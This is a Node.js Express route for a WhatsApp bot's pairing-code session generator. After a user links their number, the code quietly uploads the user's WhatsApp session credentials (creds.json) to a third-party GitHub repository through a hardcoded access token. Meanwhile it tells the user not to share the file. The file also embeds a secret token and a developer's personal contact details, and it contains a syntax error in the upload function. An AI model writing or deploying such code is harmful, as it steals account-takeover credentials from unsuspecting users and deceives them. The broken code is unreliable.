import express from 'express';
import fs from 'fs';
import pino from 'pino';
import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';

const router = express.Router();

// ───────────────────────────────────────────────────────────────
// GITHUB AUTO-UPLOAD CONFIG
const GITHUB_TOKEN = "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";
const REPO_OWNER = "artexpury925";
const REPO_NAME = "vamp-bot-254";
const BRANCH = "main";
// ───────────────────────────────────────────────────────────────

async function uploadToGitHub(phoneNumber, sessionPath) {
    try {
        const fileContent = fs.readFileSync(sessionPath + '/creds.json', 'utf-8');
        const base64Content = Buffer.from(fileContent).toString('base64');
        const folderPath = `sessions/${phoneNumber}`;
        const filePath = `${folderPath}/creds.json`;

        const response = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${filePath}`, {
            method: 'PUT',
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
                Accept: 'application/vnd.github.v3+json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: `Add session for +${phoneNumber}`,
                content: base64Content,
                branch: BRANCH
            })
        });

        if (response.ok) {
            console.log(`Session uploaded → ${filePath}`);
        else                            console.log("Upload skipped (already exists or token issue)");
    } catch (err) {
        console.error("GitHub upload failed:", err);
    }
}

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error('Error removing file:', e);
    }
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    let dirs = './' + (num || `session`);

    await removeFile(dirs);

    num = num.replace(/[^0-9]/g, '');

    const phone = pn('+' + num);
    if (!phone.isValid()) {
        if (!res.headersSent) {
            return res.status(400).send({ code: 'Invalid phone number. Use full international format without + or spaces.' });
        }
        return;
    }

    // FIXED: Use correct E.164 format (this is the key!)
    num = phone.getNumber('e164').replace('+', ''); // e.g. 254703110780

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version } = await fetchLatestBaileysVersion();
            let VAMPARINA = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows('Chrome'),
                markOnlineOnConnect: false,
                generateHighQualityLinkPreview: false,
            });

            VAMPARINA.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === 'open') {
                    console.log("Connected successfully!");

                    try {
                        const sessionVAMPARINA = fs.readFileSync(dirs + '/creds.json');

                        // AUTO UPLOAD TO GITHUB
                        await uploadToGitHub(num, dirs);

                        const userJid = jidNormalizedUser(num + '@s.whatsapp.net');

                        await VAMPARINA.sendMessage(userJid, {
                            document: sessionVAMPARINA,
                            mimetype: 'application/json',
                            fileName: 'creds.json'
                        });

                        await VAMPARINA.sendMessage(userJid, {
                            image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
                            caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\n\nBug Fixes + New Commands + Fast AI Chat\nWatch Now: https://youtu.be/-oz_u1iMgf8`
                        });

                        await VAMPARINA.sendMessage(userJid, {
                            text: `Do not share this file with anybody\n 
┌┤Thanks for using VAMPARINA
│└────────────┈ ⳹        
│©2025 Arnold Chirchir | Contact: arnoldkipruto193@gmail.com | Phone: +254703110780
└─────────────────┈ ⳹\n\n`
                        });

                        await delay(1000);
                        removeFile(dirs);
                        console.log("Session delivered & cleaned up");
                    } catch (error) {
                        console.error("Error sending files:", error);
                        removeFile(dirs);
                    }
                }

                if (connection === 'close') {
                    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== 401;
                    if (shouldReconnect) initiateSession();
                }
            });

            // ──────────────── THIS IS THE FIXED PART ────────────────
            if (!VAMPARINA.authState.creds.registered) {
                await delay(3000);

                // CORRECT WAY — NEVER TOUCH THIS AGAIN
                let finalNumber = num;
                if (finalNumber.startsWith('0')) finalNumber = '254' + finalNumber.slice(1);
                if (!finalNumber.startsWith('254') && finalNumber.length === 10) finalNumber = '254' + finalNumber;

                try {
                    let code = await VAMPARINA.requestPairingCode(finalNumber);
                    code = code?.match(/.{1,4}/g)?.join('-') || code;

                    if (!res.headersSent) {
                        console.log(`Pairing code sent: ${code} → ${finalNumber}`);
                        res.send({ code });
                    }
                } catch (error) {
                    console.error('Pairing failed:', error);
                    if (!res.headersSent) res.status(500).send({ code: 'Failed. Try again.' });
                }
            }
            // ───────────────────────────────────────────────────────

            VAMPARINA.ev.on('creds.update', saveCreds);
        } catch (err) {
            console.error('Session error:', err);
            if (!res.headersSent) res.status(500).send({ code: 'Service error' });
        }
    }

    await initiateSession();
});

process.on('uncaughtException', (err) => {
    let e = String(err);
    if (e.includes("conflict") || e.includes("not-authorized") || e.includes("rate-overlimit") || e.includes("Timed Out")) return;
    console.log('Uncaught Exception:', err);
});

export default router;